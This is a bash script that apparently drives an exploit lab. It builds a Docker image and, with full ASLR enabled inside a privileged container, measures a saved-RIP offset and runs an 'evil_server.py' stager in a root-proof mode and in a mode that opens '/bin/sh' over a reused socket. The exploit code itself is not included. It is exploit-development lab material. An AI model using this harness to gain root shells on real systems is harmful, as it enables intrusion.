#!/usr/bin/env bash
# One-click: build the lab image, then run the single-socket reverse-staging
# exploit under FULL ASLR (randomize_va_space=2) inside an isolated container.
#
# On Apple Silicon: `colima start --arch x86_64` first (x86_64 gadgets/ABI).
set -euo pipefail
cd "$(dirname "$0")"

IMAGE=reverse-socket-stager

echo "[*] building lab image ..."
docker build --platform=linux/amd64 -t "$IMAGE" .

echo "[*] running exploit under full ASLR (isolated, --privileged for ASLR toggle) ..."
docker run --rm --platform=linux/amd64 --privileged "$IMAGE" bash -lc '
  set -e
  ulimit -c unlimited
  echo core > /proc/sys/kernel/core_pattern
  echo 2    > /proc/sys/kernel/randomize_va_space   # FULL ASLR
  echo "[*] randomize_va_space = $(cat /proc/sys/kernel/randomize_va_space)"
  cd /work
  OFF=$(python3 exploit/find_offset.py)
  echo "[*] measured saved-RIP offset = $OFF"
  echo "[*] === MODE=marker (non-interactive uid=0 proof) ==="
  OFFSET=$OFF python3 exploit/evil_server.py
  echo "[*] === MODE=shell (real /bin/sh over the reused socket) ==="
  OFFSET=$OFF MODE=shell python3 exploit/evil_server.py
  echo "[*] both modes passed."
'
